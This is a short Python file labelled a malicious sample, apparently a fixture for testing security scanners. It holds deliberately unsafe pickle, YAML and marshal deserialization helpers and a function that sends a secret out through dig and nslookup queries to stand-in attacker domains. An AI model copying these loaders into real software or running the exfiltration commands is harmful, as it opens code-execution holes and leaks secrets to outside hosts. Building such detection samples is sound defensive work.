# Malicious sample: deserialization attack + DNS exfiltration
# Pattern: pickle/yaml deserialization leading to arbitrary code execution

import pickle
import yaml
import marshal
import subprocess

def load_config(data):
    """Unsafe deserialization — arbitrary code execution."""
    return pickle.loads(data)

def load_yaml_config(path):
    """Unsafe YAML load — can execute arbitrary Python."""
    with open(path) as f:
        return yaml.load(f, Loader=yaml.Loader)

def load_cache(data):
    """Marshal deserialization — code execution."""
    return marshal.loads(data)

def exfil_dns(secret):
    """DNS exfiltration — encodes data in DNS queries."""
    subprocess.run(["dig", f"{secret}.exfil.attacker.com", "TXT"])
    subprocess.run(["nslookup", f"{secret}.leak.evil.org"])
